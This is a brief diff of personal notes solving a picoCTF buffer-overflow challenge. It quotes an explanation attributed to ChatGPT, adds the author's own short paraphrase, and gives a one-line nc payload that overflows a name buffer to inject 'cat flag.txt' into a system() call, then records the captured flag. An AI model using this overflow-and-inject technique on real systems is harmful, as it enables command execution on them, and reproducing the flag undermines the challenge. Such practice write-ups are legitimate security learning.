@@ -1,0 +1,12 @@
+
+Definition (chatgpt): 
+1. strcpy(buffer, name) copies more than 10 bytes, overflowing buffer and overwriting the adjacent c array that initially held "uname".
+2. When you write "cat flag.txt" into c, the program calls system(c), so it runs your command and prints the flag.
+
+
+my view --> char which uname that store name more than 10 chars and added command line
+
+
+printf 'AAAAAAAAAAcat flag.txt\n' | nc saffron-estate.picoctf.net 64303
+
+picoCTF{0v3rfl0w_c0mm4nd_d3eb7161}
